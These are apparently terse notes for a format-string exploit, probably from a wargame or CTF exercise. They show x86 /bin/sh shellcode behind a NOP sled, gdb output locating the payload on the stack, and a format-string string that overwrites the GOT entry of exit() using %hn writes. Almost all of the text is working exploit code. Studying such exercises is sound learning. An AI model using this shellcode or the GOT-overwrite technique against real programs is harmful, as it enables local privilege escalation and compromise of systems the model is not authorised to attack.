```python

python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'

```

PAYLOAD

```bash
(gdb) p/d 0xffffdf40 #adress of PAYLOAD in stack
$1 = 4294958912
```

0xffff is 65535 heigh order bits
0xdf40 is 57152 low order bits

the 10th argument where we can write

got of exit() = 0x80497e0 0x80497e2

python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%57144x%10$hn%8383x%11$hn"'>
